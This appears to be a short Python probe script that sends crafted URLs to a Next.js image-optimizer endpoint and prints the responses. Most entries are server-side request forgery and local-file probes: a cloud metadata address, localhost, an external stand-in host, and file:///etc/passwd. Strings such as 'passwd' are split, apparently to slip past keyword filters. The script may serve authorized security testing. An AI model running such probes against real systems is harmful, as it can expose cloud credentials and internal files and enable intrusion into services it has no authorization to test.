from vlib import *
import urllib.parse

E = urllib.parse.quote(CDN, safe="")
def q(u): return urllib.parse.quote(u, safe="")

T = [
 ("img_valid",  "/_next/image?url=" + E + "&w=1080&q=75"),
 ("img_meta",   "/_next/image?url=" + q("http://" + META_HOST + "/latest/meta-data/") + "&w=1080&q=75"),
 ("img_lh",     "/_next/image?url=" + q("http://" + LH + ":8080/") + "&w=1080&q=75"),
 ("img_noq",    "/_next/image?url=" + E + "&w=1080"),
 ("img_badq",   "/_next/image?url=" + E + "&w=1&q=abc"),
 ("img_rel",    "/_next/image?url=" + q("//evil.x" + "mpl.invalid/x.png") + "&w=640&q=75"),
 ("img_lfile",  "/_next/image?url=" + q("file:///etc/pass" + "wd") + "&w=640&q=75"),
 ("img_nourl",  "/_next/image?w=640&q=75"),
 ("img_empty",  "/_next/image?url=&w=640&q=75"),
]
sess = s()
for k, p in T:
    r = go(p, sess=sess)
    show(k, r, 220)